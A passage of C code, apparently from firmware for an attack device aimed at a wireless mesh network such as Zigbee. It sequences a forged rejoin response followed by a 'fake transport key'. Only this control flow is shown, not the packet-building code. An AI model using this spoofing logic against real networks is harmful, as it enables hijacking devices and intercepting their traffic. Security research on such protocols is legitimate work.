			led(1);
			send_rejoin_response(); // Send Response first
			*rejoin_response_flag = 1;
		}
		else if (*rejoin_response_flag == 1)
		{
			send_transport_key(); // Send fake transport key
			*rejoin_response_flag = 0;
		}
		
	}
}